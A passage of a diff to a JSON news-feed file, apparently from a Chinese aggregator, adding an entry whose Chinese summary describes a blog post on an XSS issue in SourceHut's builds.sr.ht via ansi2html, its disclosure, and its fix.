↩︎\n\nTotally not an impulse buy. ‘To get a sense of being invested.’ I tell to myself. ↩︎",
+        "fullTranslation": "【官方正文已获取，中文全文翻译尚未完成；暂不展示外文正文。】",
+        "contentStatus": "full",
+        "translationStatus": "source-only",
+        "contentSource": "official-page",
+        "contentKind": "official-page-body",
+        "contentParagraphs": 53,
+        "translationParagraphs": 0,
+        "keyTakeaways": [
+          "来源叙事重点：文章聚焦 SourceHut 的 builds.sr.ht 使用 ansi2html 处理构建日志时存在的跨站脚本（XSS）风险。作者描述了漏洞发现、向 SourceHut 报告、修复以及推动上游 ansi2html 恢复维护和发布新版本的过程，并进一步主张该漏洞潜在影响可能高于通常的中等级别。文中还穿插作者对软件分发、开源维护、CVE/CVSS 评分和漏洞披露流程的个人评论。"
+        ],
+        "citations": [
+          {
+            "source": "Lobste.rs (极客思想社区)",
+            "sourceLang": "en",
+            "publishedAt": "2026-09-24T20:38:32.000Z",
+            "url": "https://blog.arusekk.pl/posts/srht-account-takeover/"
+          }
+        ]
+      }
+    ]
+  },
+  {
     "timestamp": 1790274663711,
     "timeDisplay": "2026-09-25 02:31 (UTC+8)",
     "date": "2026-09-25",
